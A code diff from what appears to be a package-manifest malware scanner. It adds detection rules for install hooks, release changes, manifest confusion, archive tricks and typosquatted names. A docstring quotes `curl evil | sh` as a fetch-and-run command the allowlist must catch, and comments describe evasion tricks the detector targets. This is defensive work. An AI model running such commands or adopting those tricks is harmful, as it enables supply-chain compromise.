@@ -21,6 +21,7 @@ The finding says the safety net is absent, not that something is wrong.
 
 from __future__ import annotations
 
+import posixpath
 import re
 from typing import TYPE_CHECKING
 
@@ -44,7 +45,7 @@ from cordon_scanner.core.redact import Redactor
 from cordon_scanner.core.scoring import ScoringContext
 from cordon_scanner.detect.base import BaseDetector, DetectorRequirements, FileUnit, ScanContext
 from cordon_scanner.detect.catalogue import DeclaredRule
-from cordon_scanner.detect.secrets import FIXTURE_CEILING, is_test_material
+from cordon_scanner.detect.secrets import FIXTURE_CEILING, SourcePaths
 from cordon_scanner.ecosystems.registry import EcosystemRegistry
 
 if TYPE_CHECKING:
@@ -146,66 +147,141 @@ VENDORED_DIRECTORIES = (
 )
 
 
-def _is_vendored(path: str) -> bool:
-    """Whether this manifest belongs to an installed dependency rather than here."""
-    segments = path.replace("\\", "/").split("/")
-    return any(segment in VENDORED_DIRECTORIES for segment in segments)
+class ManifestScripts:
+    """Whose manifest this is, and what its lifecycle commands run."""
+
+    @staticmethod
+    def _is_vendored(path: str) -> bool:
+        """Whether this manifest belongs to an installed dependency rather than here."""
+        segments = path.replace("\\", "/").split("/")
+        return any(segment in VENDORED_DIRECTORIES for segment in segments)
+
+    @staticmethod
+    def _is_first_party(path: str, ctx: ScanContext) -> bool:
+        """Whether this manifest is the scanned project's own.
+
+        Two conditions, and both took a corpus failure to get right.
+
+        The manifest must not be under a dependency directory, and the scan target must
+        BE a git repository root.
+
+        Vendoring alone is not enough, because the case that matters most has no vendor
+        directory in it: a published package, an sdist, a downloaded tarball. There the
+        hostile manifest IS the root manifest, and three malicious samples in this
+        project's own corpus are exactly that shape -- `acme-telemetry`, built to look
+        like a real npm compromise, went from high to low on the path test alone.
+
+        `is_git` was the obvious second condition and is the wrong one. It answers
+        "is there a repository above this", so scanning
+        `corpus/malicious/acme-telemetry` from inside a checkout answers yes, and every
+        downloaded package or extracted archive examined anywhere inside any repository
+        reads as first-party. The question is whether the thing handed to the scanner is
+        the working tree itself, which is what `scanned_repository_root` records.
+
+        What the downgrade gives up is nothing, and the same corpus sample proves it:
+        `acme-telemetry` declares three CRITICAL findings besides the install-script
+        one, because the script the manifest points at is read by the content detectors
+        on its own merits. The manifest finding is a pointer at a file. The file is
+        where the answer is.
+        """
+        if ManifestScripts._is_vendored(path):
+            return False
+        return bool(ctx.repository is not None and ctx.repository.scanned_repository_root)
+
+    @staticmethod
+    def _targets_in_tree(
+        command: str, known: frozenset[str], manifest_path: str = ""
+    ) -> tuple[str, ...]:
+        """Files in this repository that the command runs.
+
+        A first-party install script that runs a file in the same repository is a
+        different proposition from one that runs something opaque. The file is tracked,
+        was reviewed when it landed, and -- the part that matters most here -- is being
+        scanned by every content detector in this same run. Reporting the manifest at
+        high severity for pointing at a file the scanner has already read and cleared
+        says nothing the reader can act on.
+
+        `ctx.install_hook_paths` is the engine's own resolution of every install hook
+        to the in-tree files it reaches, so this asks a question that has already been
+        answered rather than parsing shell a second time and disagreeing about it.
+        """
+        if not known:
+            return ()
+        tokens = {
+            token.strip("\"'`()").lstrip("./")
+            for token in re.split(r"[\s;|&]+", command)
+            if token.strip()
+        }
+        # Relative to the manifest, as the package manager runs it: `node install.js` in
+        # `esbuild.tgz!package/package.json` is `esbuild.tgz!package/install.js`.
+        base = manifest_path.rpartition("/")[0]
+        if base:
+            tokens |= {posixpath.normpath(f"{base}/{token}") for token in list(tokens) if token}
+        # Node resolves `./postinstall` to `postinstall.js` and friends.
+        tokens |= {
+            f"{token}{suffix}"
+            for token in list(tokens)
+            if token and "." not in posixpath.basename(token)
+            for suffix in (".js", ".cjs", ".mjs", "/index.js")
+        }
+        return tuple(
+            sorted(path for path in known if path in tokens or path.lstrip("./") in tokens)
+        )
+
+    @staticmethod
+    def _prints_only(command: str) -> bool:
+        """Whether every interpreter one-liner in this command only talks or exits.
+
+        Conservative in the direction that matters. A command with no extractable `-e`/`-c`
+        program is not inert; any substring from `NOT_INERT` disqualifies the whole command;
+        and every call the program makes has to be one of the printing or exiting ones, so a
+        program that prints AND does something else is not excused.
+        """
+        programs = [
+            next((group for group in match.groups() if group), "")
+            for match in ONE_LINER_PROGRAM.finditer(command)
+        ]
+        if not programs:
+            return False
+        if any(marker in command for marker in NOT_INERT):
+            return False
+        for body in programs:
+            if not body:
+                return False
+            calls = ANY_CALL.findall(body)
+            inert = INERT_CALL.findall(body)
+            if len(calls) != len(inert):
+                return False
+        return True
+
+    @staticmethod
+    def _is_safe_lifecycle(command: str) -> bool:
+        """Whether a lifecycle command is a recognised build step.
+
+        Compared against the whole command after stripping shell chaining, so
+        `node-gyp rebuild && curl evil | sh` is not waved through by its first
+        clause -- which is how an allowlist that matched a prefix of the raw string
+        would have been defeated in one move.
+        """
+        parts = [p.strip() for p in re.split(r"&&|\|\||;|\||\n", command) if p.strip()]
+        if not parts:
+            return False
+        return all(
+            any(part == safe or part.startswith(f"{safe} ") for safe in SAFE_LIFECYCLE_PREFIXES)
+            for part in parts
+        )
 
 
-def _is_first_party(path: str, ctx: ScanContext) -> bool:
-    """Whether this manifest is the scanned project's own.
+_REQUIRE_ONLY = re.compile(
+    r"""^node\s{1,4}-e\s{1,4}["']\s{0,4}(?:try\s{0,4}\{\s{0,4})?require\(\s{0,4}['"](?P<path>\.{1,2}/[^'"\s]{1,200})['"]\s{0,4}\)\s{0,4};?"""
+    r"""\s{0,4}(?:\}\s{0,4}catch\s{0,4}(?:\(\s{0,4}\w{0,20}\s{0,4}\))?\s{0,4}\{\s{0,4}\}\s{0,4})?["']$"""
+)
+"""`node -e "try{require('./postinstall')}catch(e){}"`: an inline command that only loads a file."""
 
-    Two conditions, and both took a corpus failure to get right.
-
-    The manifest must not be under a dependency directory, and the scan target must
-    BE a git repository root.
-
-    Vendoring alone is not enough, because the case that matters most has no vendor
-    directory in it: a published package, an sdist, a downloaded tarball. There the
-    hostile manifest IS the root manifest, and three malicious samples in this
-    project's own corpus are exactly that shape -- `acme-telemetry`, built to look
-    like a real npm compromise, went from high to low on the path test alone.
-
-    `is_git` was the obvious second condition and is the wrong one. It answers
-    "is there a repository above this", so scanning
-    `corpus/malicious/acme-telemetry` from inside a checkout answers yes, and every
-    downloaded package or extracted archive examined anywhere inside any repository
-    reads as first-party. The question is whether the thing handed to the scanner is
-    the working tree itself, which is what `scanned_repository_root` records.
-
-    What the downgrade gives up is nothing, and the same corpus sample proves it:
-    `acme-telemetry` declares three CRITICAL findings besides the install-script
-    one, because the script the manifest points at is read by the content detectors
-    on its own merits. The manifest finding is a pointer at a file. The file is
-    where the answer is.
-    """
-    if _is_vendored(path):
-        return False
-    return bool(ctx.repository is not None and ctx.repository.scanned_repository_root)
-
-
-def _targets_in_tree(command: str, known: frozenset[str]) -> tuple[str, ...]:
-    """Files in this repository that the command runs.
-
-    A first-party install script that runs a file in the same repository is a
-    different proposition from one that runs something opaque. The file is tracked,
-    was reviewed when it landed, and -- the part that matters most here -- is being
-    scanned by every content detector in this same run. Reporting the manifest at
-    high severity for pointing at a file the scanner has already read and cleared
-    says nothing the reader can act on.
-
-    `ctx.install_hook_paths` is the engine's own resolution of every install hook
-    to the in-tree files it reaches, so this asks a question that has already been
-    answered rather than parsing shell a second time and disagreeing about it.
-    """
-    if not known:
-        return ()
-    tokens = {
-        token.strip("\"'`()").lstrip("./")
-        for token in re.split(r"[\s;|&]+", command)
-        if token.strip()
-    }
-    return tuple(sorted(path for path in known if path in tokens or path.lstrip("./") in tokens))
+READABLE_HOOK_TARGETS = frozenset(
+    {"js", "cjs", "mjs", "ts", "py", "sh", "bash", "rb", "pl", "php", "ps1"}
+)
+"""Hook targets the content detectors read as source. A binary or extensionless executable is not."""
 
 
 #: What a one-liner does when all it does is talk.
@@ -286,49 +362,6 @@ and a longer one simply does not match -- which reports it, the safe direction.
 """
 
 
-def _prints_only(command: str) -> bool:
-    """Whether every interpreter one-liner in this command only talks or exits.
-
-    Conservative in the direction that matters. A command with no extractable `-e`/`-c`
-    program is not inert; any substring from `NOT_INERT` disqualifies the whole command;
-    and every call the program makes has to be one of the printing or exiting ones, so a
-    program that prints AND does something else is not excused.
-    """
-    programs = [
-        next((group for group in match.groups() if group), "")
-        for match in ONE_LINER_PROGRAM.finditer(command)
-    ]
-    if not programs:
-        return False
-    if any(marker in command for marker in NOT_INERT):
-        return False
-    for body in programs:
-        if not body:
-            return False
-        calls = ANY_CALL.findall(body)
-        inert = INERT_CALL.findall(body)
-        if len(calls) != len(inert):
-            return False
-    return True
-
-
-def _is_safe_lifecycle(command: str) -> bool:
-    """Whether a lifecycle command is a recognised build step.
-
-    Compared against the whole command after stripping shell chaining, so
-    `node-gyp rebuild && curl evil | sh` is not waved through by its first
-    clause -- which is how an allowlist that matched a prefix of the raw string
-    would have been defeated in one move.
-    """
-    parts = [p.strip() for p in re.split(r"&&|\|\||;|\||\n", command) if p.strip()]
-    if not parts:
-        return False
-    return all(
-        any(part == safe or part.startswith(f"{safe} ") for safe in SAFE_LIFECYCLE_PREFIXES)
-        for part in parts
-    )
-
-
 class ManifestDetector(BaseDetector):
     """Inspects dependency manifests."""
 
@@ -342,6 +375,165 @@ class ManifestDetector(BaseDetector):
     @staticmethod
     def declared_rules() -> tuple[DeclaredRule, ...]:
         return (
+            DeclaredRule(
+                id="SUSPECT.INSTALL.UNEXAMINED.001",
+                title="Install-time code too large or slow to examine",
+                severity=Severity.HIGH,
+                confidence=Confidence.HIGH,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message=(
+                    "A file that runs at install was truncated or ran out of its time budget, so "
+                    "part of it was never examined. Install scripts are kilobytes; one padded past "
+                    "the limits keeps its payload out of reach."
+                ),
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Read the file in full before installing; raise the scan limits to examine it.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.RELEASE.NEW_INSTALL_HOOK.001",
+                title="This release runs code at install that the previous release did not",
+                severity=Severity.HIGH,
+                confidence=Confidence.MEDIUM,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message="This release runs code at install that the previous release did not, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Read what changed between the two releases before installing this one.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.RELEASE.NEW_CAPABILITY.001",
+                title="This release's flagged code gains network, process or execution capability",
+                severity=Severity.HIGH,
+                confidence=Confidence.MEDIUM,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message="This release's flagged code gains network, process or execution capability, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Read what changed between the two releases before installing this one.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.RELEASE.NEW_OBFUSCATION.001",
+                title="This release ships obfuscated code where the previous shipped none",
+                severity=Severity.HIGH,
+                confidence=Confidence.MEDIUM,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message="This release ships obfuscated code where the previous shipped none, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Read what changed between the two releases before installing this one.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.RELEASE.NEW_BINARY.001",
+                title="This release adds compiled files",
+                severity=Severity.MEDIUM,
+                confidence=Confidence.MEDIUM,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message="This release adds compiled files, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Read what changed between the two releases before installing this one.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.PACKAGE.MANIFEST_CONFUSION.001",
+                title="The manifest npm serves is not the package.json in the tarball",
+                severity=Severity.HIGH,
+                confidence=Confidence.HIGH,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message=(
+                    "The registry's copy of the manifest disagrees with the tarball's own package.json "
+                    "on install scripts, dependencies, commands, name or version (`--online`, for a "
+                    "published npm tarball). npm installs from the tarball, so the registry's view hides "
+                    "what runs; critical when the difference is an install script."
+                ),
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Do not install this version; read the tarball's package.json and report the package.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.RELEASE.NEW_PUBLISHER.001",
+                title="This release was published by a different account than the previous one",
+                severity=Severity.MEDIUM,
+                confidence=Confidence.MEDIUM,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message="This release was published by a different account than the previous one, compared with the release before it (`--compare-with`, or `--online` for a published artefact).",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Read what changed between the two releases before installing this one.",
+            ),
+            DeclaredRule(
+                id="MALWARE.PACKAGE.KNOWN.001",
+                title="The scanned package is a recorded malicious release",
+                severity=Severity.CRITICAL,
+                confidence=Confidence.CONFIRMED,
+                category=Category.MALICIOUS,
+                detector="advisory",
+                message="The package's own manifest names a release the malicious-package records list.",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Do not install it; treat any machine that did as compromised.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.ARCHIVE.PATH_ESCAPE.001",
+                title="Archive member named to write outside the archive",
+                severity=Severity.HIGH,
+                confidence=Confidence.HIGH,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message="An archive member's name is absolute or climbs out with `..`.",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Do not unpack or install it.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.ARCHIVE.POLYGLOT.001",
+                title="Archive that is a tarball and a zip at once",
+                severity=Severity.HIGH,
+                confidence=Confidence.HIGH,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message="The file begins as a tar or compressed stream and ends as a zip, so different tools read different contents.",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Do not install it.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.ARCHIVE.NESTING.001",
+                title="Archives nested past the depth the scan opens",
+                severity=Severity.HIGH,
+                confidence=Confidence.HIGH,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message="The innermost archive was never examined; depth past two levels keeps a payload out of reach.",
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Raise limits.max_archive_depth and examine the inner archives before installing.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.BINARY.NATIVE_IN_PURE_WHEEL.001",
+                title="A pure-Python wheel loads a native library it carries",
+                severity=Severity.HIGH,
+                confidence=Confidence.HIGH,
+                category=Category.SUSPICIOUS,
+                detector="binary",
+                message=(
+                    "The wheel is tagged none-any, declaring no compiled code, and loads a native "
+                    "library shipped inside it into the interpreter with ctypes."
+                ),
+                references=(references.OBSCURED_SECURITY_DATA,),
+                remediation="Do not install it; genuine native code ships as platform wheels.",
+            ),
+            DeclaredRule(
+                id="SUSPECT.TYPOSQUAT.PACKAGE_NAME.001",
+                title="Package is named like a popular package",
+                severity=Severity.HIGH,
+                confidence=Confidence.MEDIUM,
+                category=Category.SUSPICIOUS,
+                detector=ManifestDetector.id,
+                message=(
+                    "The scanned package's own name is one slip from a widely used package and "
+                    "is not itself established: the shape of a typosquat waiting for the typo. "
+                    "HIGH for a published artefact, MEDIUM for a working tree."
+                ),
+                references=(references.DEPENDENCY_CONFUSION,),
+                remediation="Install the package that was meant, and report this one.",
+            ),
             DeclaredRule(
                 id="MALWARE.INSTALL.FETCH_EXEC.001",
                 title="Install script fetches and executes remote content",
@@ -424,7 +616,63 @@ class ManifestDetector(BaseDetector):
         findings: list[Finding] = []
         findings.extend(self._lifecycle_findings(manifest, unit, ctx))
         findings.extend(self._source_findings(manifest, unit, ctx))
+        findings.extend(self._own_name_findings(manifest, unit, ctx, ecosystem_id))
         return findings
+
+    def _own_name_findings(
+        self, manifest: Manifest, unit: FileUnit, ctx: ScanContext, ecosystem_id: str
+    ) -> Iterable[Finding]:
+        """A package whose own name is a slip of a popular one.
+
+        The dependency check asks this of what a project installs; a scanned package is asked
+        of itself. `aiiohttp`, `cryptograohy` and `botocote` are published with nothing in
+        them but the name, waiting for the typo -- there is no code to find, and the name is the
+        whole of the evidence.
+        """
+        from cordon_scanner.detect.dependency import DependencyDetector
+        from cordon_scanner.intel.popular import PackageIntel
+
+        if not manifest.name or "node_modules/" in f"/{unit.path}" or "site-packages/" in unit.path:
+            return
+        ecosystem = EcosystemRegistry.get(ecosystem_id)
+        if ecosystem is None:
+            return
+        name = ecosystem.normalize_name(manifest.name)
+        if PackageIntel.is_known_package(ecosystem_id, name):
+            return
+        target = DependencyDetector._typosquat_target(ecosystem_id, name)
+        if target is None:
+            return
+        # A published artefact: the archive scanned as one, an npm tarball's `package/`, or an
+        # extracted sdist, whose root is `<name>-<version>/` by the format's own convention.
+        directory = posixpath.basename(unit.path.rpartition("!")[2].rpartition("/")[0])
+        sdist_root = re.fullmatch(
+            rf"{re.escape(name).replace('-', '[-_.]')}-\d[\w.+!-]{{0,40}}",
+            directory.lower().replace("_", "-"),
+        )
+        published = (
+            ctx.package_distribution
+            or sdist_root is not None
+            or unit.path.rpartition("!")[2] == "package/package.json"
+        )
+        yield self._finding(
+            rule_id="SUSPECT.TYPOSQUAT.PACKAGE_NAME.001",
+            category=Category.SUSPICIOUS,
+            severity=Severity.HIGH if published else Severity.MEDIUM,
+            confidence=Confidence.MEDIUM,
+            title="Package is named like a popular package",
+            message=(
+                f"This package calls itself {manifest.name!r}, one slip from the widely used "
+                f"{target!r}, and is not itself an established package. A published package "
+                f"under a name like this collects the installs meant for the other."
+            ),
+            remediation=f"Install {target!r} if that is what was meant, and report this one.",
+            unit=unit,
+            ctx=ctx,
+            detail=f"{manifest.name} ~ {target}",
+            capabilities=[],
+            reasons=[f"one edit from {target}"],
+        )
 
     # -- Lifecycle scripts -----------------------------------------------
 
@@ -435,6 +683,11 @@ class ManifestDetector(BaseDetector):
             command = hook.command
             if not command:
                 continue
+            loader = _REQUIRE_ONLY.match(command.strip())
+            if loader:
+                # A one-liner whose only act is to load a file beside the manifest is that file,
+                # run: graded by what the file is, as `node <file>` would be.
+                command = f"node {loader.group('path')}"
 
             capabilities: list[Capability] = []
             reasons: list[str] = []
@@ -444,7 +697,7 @@ class ManifestDetector(BaseDetector):
                     capabilities.append(capability)
                     reasons.append(f"invokes {needle.strip()!r}")
 
-            if capabilities and _prints_only(command):
+            if capabilities and ManifestScripts._prints_only(command):
                 # A one-liner whose whole effect is a message or an exit. See
                 # `INERT_CALL`. The capability it named is real -- `node -e` does
                 # evaluate a string -- and what it evaluates is a line of text.
@@ -459,7 +712,7 @@ class ManifestDetector(BaseDetector):
             # Case-insensitively, because npm spells one of them `prepublishOnly`.
             install_time = hook.name.lower() in INSTALL_TIME_HOOKS
             if not capabilities:
-                if not install_time or _is_safe_lifecycle(command):
+                if not install_time or ManifestScripts._is_safe_lifecycle(command):
                     continue
                 # An install-time script that is not a recognised build step.
                 # Reported for existing, rather than for containing a word from
@@ -468,9 +721,23 @@ class ManifestDetector(BaseDetector):
                 # compromises actually take. What the referenced file does is a
                 # separate question the file detectors answer -- and cannot
                 # answer at all if nothing points at it.
-                first_party = _is_first_party(unit.path, ctx)
+                first_party = ManifestScripts._is_first_party(unit.path, ctx)
                 vendored = not first_party
-                in_tree = _targets_in_tree(command, ctx.install_hook_paths) if first_party else ()
+                in_tree = (
+                    (unit.path,)
+                    if hook.kind == "consumerinstall" and unit.path in ctx.install_hook_paths
+                    else ManifestScripts._targets_in_tree(
+                        command, ctx.install_hook_paths, unit.path
+                    )
+                )
+                # A published package's hook that runs only source files inside the package:
+                # those files were scanned in this run with install-time escalation, so a
+                # payload in them is already reported as what it is. What runs something
+                # opaque -- a binary, an inline `-e` string, a file that is not there -- keeps
+                # the dependency grading, because then this finding is all there is.
+                readable = bool(in_tree) and all(
+                    path.rsplit(".", 1)[-1].lower() in READABLE_HOOK_TARGETS for path in in_tree
+                )
                 yield self._finding(
                     rule_id="SUSPECT.INSTALL.SCRIPT.001",
                     category=Category.SUSPICIOUS,
@@ -482,7 +749,11 @@ class ManifestDetector(BaseDetector):
                     # consumer installing from a registry tarball. See
                     # `AUTHOR_TIME_HOOKS`.
                     severity=min(
-                        Severity.HIGH if vendored else Severity.LOW if in_tree else Severity.MEDIUM,
+                        (Severity.MEDIUM if readable else Severity.HIGH)
+                        if vendored
+                        else Severity.LOW
+                        if in_tree
+                        else Severity.MEDIUM,
                         Severity.MEDIUM
                         if hook.name.lower() in AUTHOR_TIME_HOOKS
                         else Severity.CRITICAL,
@@ -501,6 +772,12 @@ class ManifestDetector(BaseDetector):
                             f"project's own - it is a dependency's, or this is a "
                             f"published package rather than a working tree - so nobody "
                             f"here wrote it and no review here covered it."
+                            + (
+                                f" It runs {', '.join(in_tree)}, which this scan read as "
+                                f"install-time code; anything it does is reported there."
+                                if readable
+                                else ""
+                            )
                         )
                         if vendored
                         else (
@@ -656,7 +933,7 @@ class ManifestDetector(BaseDetector):
     ) -> Finding:
         line = self._line_of(unit, detail)
 
-        if category is not Category.MALICIOUS and is_test_material(unit.path):
+        if category is not Category.MALICIOUS and SourcePaths.is_test_material_here(unit.path, ctx):
             # The ceiling every other detector applies, arrived at last here because a
             # manifest felt like the one file that is never a fixture. It is: a package
             # manager's own tests need packages to install, so pnpm carries
